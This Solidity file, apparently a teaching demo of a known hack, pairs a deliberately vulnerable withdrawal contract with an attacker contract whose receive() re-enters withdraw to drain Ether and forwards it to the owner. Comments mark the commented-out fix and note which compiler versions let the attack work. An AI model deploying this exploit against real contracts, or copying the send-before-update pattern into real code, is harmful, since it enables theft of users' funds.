// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;   
//pragma solidity >=0.7.0 <0.8.0;                            // Works up to < 0.8.0 
//  Attack version < 0.8.0  &   Victim version >= 0.8.0        FAILS
//  Attack version >= 0.8.0 &   Victim version < 0.8.0         Works

// Resources: https://solidity-by-example.org/hacks/re-entrancy/

contract Victim_Reentrancy {                                       
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public returns (bool) {
        uint bal = balances[msg.sender];

        require(bal >= _amount, "Insufficient amout!");

        //balances[msg.sender] -= _amount;                                 // Avoid reentrancy attack

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;                            // This is the key line, before sendint ETH to msg.sender we must update balance first

        return sent;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


contract Attack_Reentrancy {
    Victim_Reentrancy public tienda;
    address payable owner;

    constructor(address _victimAddress) {
        tienda = Victim_Reentrancy(_victimAddress);
        owner = payable(msg.sender);
    }

    // Receive is called when Victim contract sends Ether to this contract.
    receive() external payable {
        if (address(tienda).balance >= 1 ether) {
            tienda.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        tienda.deposit{value: 1 ether}();
        tienda.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdraw_my_funds() public returns (bool) {
        require(msg.sender == owner);
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

}
